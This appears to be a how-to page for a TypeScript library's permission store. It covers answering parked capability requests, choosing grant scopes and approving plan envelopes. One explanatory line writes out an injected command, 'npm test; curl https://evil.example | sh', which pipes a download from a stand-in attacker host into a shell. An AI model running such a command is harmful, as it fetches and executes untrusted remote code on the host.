---
title: "Answer permission requests"
description: "Run an attended GrantStore: read the parked requests, show an operator what each one asks for, reply with once, run, remembered, or deny, and approve a whole plan with an envelope."
sidebar:
  order: 3
---

An attended store parks the asking fiber instead of refusing it. This guide is
for the code on the other side of that park: the control plane, the CLI
prompt, or the test that answers.

## Hold the store, not just the layer

To reply you need the service itself, so build it with `GrantStore.make` and
provide it to the guarded host:

```ts
import { GrantStore, HostServices } from "@smthrs/kernel"
import { Effect } from "effect"

const withAttendedHost = Effect.gen(function*() {
  // `attended` defaults to true. `runId` and `planDigest` scope the grants.
  const store = yield* GrantStore.make({ runId: "run-1", planDigest: "plan-abc" })

  return yield* work.pipe(
    Effect.provide(HostServices.layer),
    Effect.provideService(GrantStore.GrantStore, store)
  )
}).pipe(Effect.scoped)
```

The store is scoped. Closing its scope rejects every waiter with
`permission_denied` and the reason `"grant store closed"`, and every later call
fails with `store_closed`. Nothing is left hanging.

## Read what is parked

`store.list` is a frozen snapshot of the pending requests:

```ts
const requests = yield * store.list
// [{ requestId, capability, tier, meta }]
```

| Field        | What to show                                                                                                                           |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------- |
| `requestId`  | The handle you reply with. Not for display.                                                                                            |
| `capability` | The action and the exact resource. This is what the operator is approving.                                                             |
| `tier`       | `sealed`, `compensable`, or `irreversible`: what re-running the operation would cost. Show it.                                         |
| `meta`       | Display metadata the decorator attached. For a spawn, `cwd` and the **names** of overridden environment variables. Never their values. |

Show the resource verbatim. It is the exact string that will be matched, and
the difference between `/workspace/src` and `/workspace/src/../..` is the whole
decision.

## Reply

```ts
yield * store.reply(request.requestId, "once")
```

| Resolution   | Use it when                                                                                                                                                                        |
| ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `once`       | This one operation, nothing more. Adds no rule.                                                                                                                                    |
| `run`        | Everything like it for the rest of this run. Requires a `planDigest` on the store; without one the reply fails with `invalid_resolution` and `"run grants require a plan digest"`. |
| `remembered` | Everything like it, now and in later processes, once a journal-backed store is persisting.                                                                                         |
| `deny`       | Refuse. The parked fiber fails with `permission_denied` and the reason `"permission request denied"`.                                                                              |

For `run` and `remembered` you may pass a third argument, an explicit
`CapabilityPattern`, to say what "everything like it" means:

```ts
yield * store.reply(
  request.requestId,
  "run",
  new Capability.CapabilityPattern({ action: "fs:read", resource: "/workspace/src/**" })
)
```

Without one, the pattern is derived from the exact capability. A resource that
contains glob metacharacters has no unambiguous derived pattern, so the reply
fails and tells you to supply one or resolve `once`.

A supplied pattern is checked before it is stored. It cannot name a different
action, reach a more dangerous effect tier than the request displayed, or be a
wildcard-bearing pattern identical to the resource; any of those fails with
`invalid_resolution` and `"grant pattern exceeds the requested authority"`.

Adding a rule wakes every other parked request the new rule now allows, so one
`run` grant for `/workspace/**` clears the queue behind it instead of asking
once per file.

## Approve a whole plan at once

A per-operation prompt is the wrong shape when a plan already declared what it
needs. `grantEnvelope` approves the whole set before the work starts:

```ts
yield * store.grantEnvelope({
  planDigest: "plan-abc",
  scope: "run",
  patterns: [
    new Capability.CapabilityPattern({ action: "fs:read", resource: "/workspace/**" }),
    new Capability.CapabilityPattern({ action: "proc:spawn", resource: "npm test" })
  ]
})
```

Grant commands exactly. A `*` in a `proc:spawn` resource matches any text,
including `;` and line breaks. A `shell: true` line with control syntax is
checked as `sh -c '<line>'`, and every pipeline stage is checked on its own,
so `npm test*` approves neither `npm test; curl https://evil.example | sh` nor
the `sh` stage of a pipeline. It still approves `npm test --watch` and any
other argument list.

An envelope is a set, not a sequence. Its patterns are deduplicated and sorted
before anything is stored, so approving the same predicates in a different
order is the same approval and the repeat is a no-op rather than a second
durable record. `GrantStore.envelopeSignature(planDigest, scope, patterns)`
computes that identity if you need to compare envelopes yourself.

`scope` is `"run"` (the default) or `"remembered"`. Envelope patterns must
preserve exact action and filesystem effect-tier boundaries, so an envelope
cannot turn a read approval into a write one.

A store can also be constructed with an envelope already approved, through
`MakeOptions.envelope`, and told which signatures are already durable through
`MakeOptions.envelopeSignatures`. A construction envelope whose signature is
already seeded still activates its rules but is not persisted again.

## Errors you can get back

`reply` and `grantEnvelope` fail with a `GrantStoreError`. The in-memory store
raises four codes:

| Code                 | Cause                                                                                                                    |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `request_not_found`  | No request with that id is parked. It was already answered, or the store was rebuilt.                                    |
| `store_closed`       | The store's scope has closed.                                                                                            |
| `invalid_resolution` | An unknown resolution, a pattern that exceeds the request, a missing plan digest for a `run` grant, or a bound exceeded. |
| `journal_failed`     | Only from `JournalGrantStore`: the decision could not be persisted, so it was not activated.                             |

`GrantStoreErrorCode` also includes `duplicate_request`, which an attended
surface of your own may use; the kernel's in-memory store does not raise it.

## Related

- [How a grant decision is made](../concepts/grant-decisions.md): what turns
  into a parked request in the first place.
- [Persist grants across restarts](./persist-grants-across-restarts.md): make
  `remembered` mean something after the process exits.
